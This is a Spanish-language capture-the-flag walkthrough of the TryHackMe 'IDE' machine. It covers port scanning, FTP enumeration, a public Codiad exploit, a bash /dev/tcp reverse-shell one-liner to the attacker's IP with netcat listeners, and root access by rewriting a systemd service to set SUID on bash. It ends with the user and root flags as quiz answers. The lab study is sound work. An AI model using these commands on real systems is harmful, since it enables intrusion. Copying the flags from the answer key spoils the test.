# Máquina IDE

Dificultad --> Facil 

Instrucciones --> **Para poder resolver esta máquina tienes que registrarte en la página de TryHackMe y buscarla por el nombre de IDE**

'

-------------------------------------------------------------------------------------------------------------------------------------------------------------------

'

## 1.Reconocmiento

![image](https://github.com/user-attachments/assets/2cfb7b62-1365-4b8f-a0e2-c160ccdde0ae)


Escaneando puertos y sus versiones utilizando el comando de nmap con diferentes parámetros

    sudo nmap -p- --open -sS -n -Pn -vvv 10.10.31.183 -T4
    
![image](https://github.com/user-attachments/assets/cdb49dd4-1483-4b66-8679-7b873a4235b9)


![image](https://github.com/user-attachments/assets/16abe497-965d-4660-8dc5-7e24049ae4d0)


    sudo nmap --open -sS -n -Pn -A -p 21,22,80,62337 -vvv 10.10.31.183 -T4


![image](https://github.com/user-attachments/assets/e3cd2024-b206-44d2-9987-86411d1ba7ed)

![image](https://github.com/user-attachments/assets/d54ba075-408d-42cf-894a-f3f38f0046ec)

![image](https://github.com/user-attachments/assets/8a20035b-1916-42e5-8f47-d5e28012af89)

### Resumen de la Información Obtenida

|IP             | Sistema OPerativo    | Puertos/Servicios        | 
|:------------: |:--------------------:| :-----------------------:| 
| 10.10.31.183  |Linux                 | 21  Ftp vsftpd 3.0.3     |
|               |                      | 22 Openssh 7.6p1         |
|               |                      | 80 hhttp apache 2.4.29   |
|               |                      | 62337 http apache 2.4.29 |


## 2. Análisis de Vulnerabilidades / Debilidades


Como tenemos un servidor http abrimos la dirección ip con el puerto 62337 e inspeccionando el código de la página encontramos que tenemos un Codiad 2.8.4


![image](https://github.com/user-attachments/assets/8fa820de-ef0a-4d24-abc6-edcc3af3d9e2)


Accedemos por ftp


![image](https://github.com/user-attachments/assets/973086c1-a5b8-41d1-889a-81ce35ce4349)


Una vez adentro nos movemos hacia atras hasta ncontrar un directorio que su nombre es un guion, el cual lo vamos a descargar en nuestra maquina


![image](https://github.com/user-attachments/assets/36fc4cd1-3b31-414e-948e-98a2110b1da2)


Nos  salimos, buscamos el archivo en nuestra maquina y lo copiamos con otro nombre archivo.txt, luego leemos su contenido con el comando cat.


![image](https://github.com/user-attachments/assets/368dd05d-5f11-45bb-b977-40c4b4b1e797)


## 3. Explotación

Podemos ver que el mensaje dice que hay dos usuario uno john y otro drac. Y que alguno de ellos tiene una contraseña por defecto.

ahora vamos a clonar un repositorio de GitHub para la vulnerabilidad de codiad


![image](https://github.com/user-attachments/assets/ba6e88f9-c61b-4ba0-9a8c-e2a1d0094fc4)


Creamos una carpeta y descargamos el exploit


![image](https://github.com/user-attachments/assets/3cd935c3-7bed-4ba3-b710-5732a43c47a2)


Ya tenemos el exploit si ejecutamos python2 exploit.py nos dirá como es la sintaxis correcta para poder ejecutarlo


![image](https://github.com/user-attachments/assets/805d1feb-eb7f-4c2e-a904-4913bcdace6f)


    python2 exploit.py http://10.10.152.247:62337/ john password 10.11.86.141 4444 linux


![image](https://github.com/user-attachments/assets/85a05733-5cfe-4a67-a9a4-de5aa25404df)


Una vez ejecutado nos dice que tenemos que ejecutar los siguientes comando en ventanas diferentes:


    echo 'bash -c "bash -i >/dev/tcp/10.11.86.141/4445 0>&1 2>&1"' | nc -lnvp 4444


![image](https://github.com/user-attachments/assets/97e82b16-3fc4-4dac-94b9-4ed979829192)


    nc -lnvp 4445


![image](https://github.com/user-attachments/assets/2dad69eb-6a3e-4c91-b542-c842595b464b)


Y proceder a darle “ y ”  


![image](https://github.com/user-attachments/assets/c14d3830-6f1e-47bf-8b93-dd92ccb2fa34)

![image](https://github.com/user-attachments/assets/1b9f598d-0558-422d-b992-0c511b3a995a)


ya una vez obtenida la conexión nos vamos al directorio raíz para buscar la carpeta home, en la carpeta drac encontramos la bandera user pero no tenemos permiso para leerla, usamos el comando:

    cat .bash_history

el cual nos permite ver un historial de los comando ejecutados en la maquina, tenemos una posible contraseña la cual es : **Th3dRaCULa1sR3a** 🔑


![image](https://github.com/user-attachments/assets/c9cae490-64b7-48fd-a2d4-0d8ad368af89)


Intentamos acceder por ssh con el usuario drac y la contraseña que conseguimos teniendo éxito


![image](https://github.com/user-attachments/assets/90a8cc57-f4e6-4743-97ac-8cdf25a474b5)


Ahora si podemos ver el contenido de la bandera user.txt 🚩 : 02930d21a8eb009f6d26361b2d24a466


![image](https://github.com/user-attachments/assets/ea291d66-7950-4d12-a5d0-5aa52c4926c0)


## 4. Escalación de privilegios

Ejecutamos el siguiente comando para ver como podemos escalar privilegios

    sudo -l


![image](https://github.com/user-attachments/assets/cc673bb8-ca7e-4f64-8a8e-8cb9cc106dc7)


Buscamos como escalar privilegios a través de esta vulnerabilidad 

/usr/sbin/service vsftpd restart


![image](https://github.com/user-attachments/assets/449f9fc2-c55c-49fb-94ed-5d21b19d3c5d)


Ahora vamos a modificar el archivo vsftpd service con el siguiente comando:

    nano /lib/systemd/system/vsftpd.service

    ExecStart=/bin/chmod 4777 /bin/bash

![image](https://github.com/user-attachments/assets/fd060e35-cc1d-4c6e-98b7-129f78eb578a)


Ejecutamos el comando y colocamos la contraseña de drac: 

    systemctl daemon-reload


![image](https://github.com/user-attachments/assets/0643083a-1297-44fe-a84d-efdcaa8c269f)


Y por ultimo el siguiente comando 

    sudo /usr/sbin/service vsftpd restart

Ahora vamos a buscar el SUID con que vamos a escalar privilegios

    find / -perm -4000 2>/dev/null


![image](https://github.com/user-attachments/assets/cc3bd6d8-a392-497b-8f0c-623b65ffcac4)



Buscamos en la pagina GtfoBins y ejecutamos el codigo que se nos indica

    bash -p


Ahora ya tenemos acceso como root y podemos ver el contenido de la bandera root 🚩:ce258cb16f47f1c66f0b0b77f4e0fb8d



## 4.Banderas 🏁

|user.txt | 02930d21a8eb009f6d26361b2d24a466 |
|:-------:|:--------------------------------:|
|root.txt | ce258cb16f47f1c66f0b0b77f4e0fb8d |


## 5.Extra 🚨

Acá las respuesta del cuestionario de TryHackMe 


user.txt 

02930d21a8eb009f6d26361b2d24a466 

root.txt 

ce258cb16f47f1c66f0b0b77f4e0fb8d 











